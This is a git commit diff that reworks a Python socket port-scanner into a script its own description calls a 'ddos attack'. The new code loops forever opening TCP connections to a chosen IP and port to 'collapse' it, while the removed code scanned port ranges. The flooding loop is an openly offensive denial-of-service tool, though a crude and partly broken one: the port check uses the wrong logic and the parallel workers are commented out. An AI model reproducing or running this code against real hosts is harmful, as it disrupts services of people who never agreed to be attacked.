c0e292222db0e4aa58df4fb114bd528392757ef6
Daniel Cascales <dromero@edrans.com>
2021-11-29 09:34:07 +0100

    Refactor networking/python nmap script

--- tests/ddos.py
+++ tests/ddos.py
@@ -7,15 +7,10 @@ import socket
 import logging
 import argparse
 
-# Configuration
-port_range_pattern = re.compile("([0-9]+)-([0-9]+)")
-port_min = 0
-port_max = 65535
-
 
 def parse_args():
     parser = argparse.ArgumentParser(
-        description="""Python nmap script using sockets"""
+        description="""Python ddos attack using sockets and concurrent futures"""
     )
     parser.add_argument(
         "-l",
@@ -37,10 +32,10 @@ def parse_args():
     )
     parser.add_argument(
         "-p",
-        "--port-range",
+        "--port",
         required=True,
-        dest="port_range",
-        help="""Port range that you want to scan""",
+        dest="port",
+        help="""Port that you want to "collapse" """,
         type=str,
     )
 
@@ -55,22 +50,23 @@ def validate_ip_address(ip_address):
         logging.error(f"{ip_address} is not a valid address")
 
 
-def extract_port_range(port_range):
-    port_range_valid = port_range_pattern.search(port_range.replace(" ", ""))
-    if port_range_valid:
-        port_min = int(port_range_valid.group(1))
-        port_max = int(port_range_valid.group(2))
-        return port_max,port_min
+def validate_port(port):
+    if int(port) < 1 and int(port) > 65535:
+        raise SystemError("Invalid port")
+    else:
+        logging.info(f"Port {port} is valid")
 
 
 def connection(ip_address,port):
-    try:
-        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-            s.settimeout(0.5)
-            s.connect((ip_address, port))
-            return f"# Port {port} opened in {ip_address}"
-    except:
-        pass
+    while True:
+        try:
+            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+                s.settimeout(0.5)
+                s.connect((ip_address, port))
+                #return f"# Attacking {port}"
+                print(f"# Attacking {port}")
+        except:
+            pass
 
 
 def main():
@@ -83,20 +79,21 @@ def main():
     )
 
     validate_ip_address(args.ip_address)
-    extract_port_range(args.port_range)
-    max_port, min_port = extract_port_range(args.port_range)
-    ports = [ports for ports in range(min_port,max_port +1)]
+    validate_port(args.port)
+    connection(args.ip_address,args.port)
+    #ports = [ports for ports in range(min_port,max_port +1)]
 
     # Multiprocessing, if not, that script is too slow
-    with ProcessPoolExecutor(max_workers=13) as executor:
-        futures = [executor.submit(connection, args.ip_address, port) for port in ports]
-        for future in as_completed(futures):
-            if future.result() is not None:
-                logging.info(f"{future.result()}")
+    # with ProcessPoolExecutor(max_workers=13) as executor:
+    #     futures = [executor.submit(connection, args.ip_address, port) for port in ports]
+    #     for future in as_completed(futures):
+    #         if future.result() is not None:
+    #             print(future.result())
 
     finish = time.perf_counter()
 
-    logging.info(f"# Finished in {round(finish - start, 2)} second(s)")
+    print(f"Finished in {round(finish - start, 2)} second(s)")
+
 
 if __name__ == '__main__':
     main()
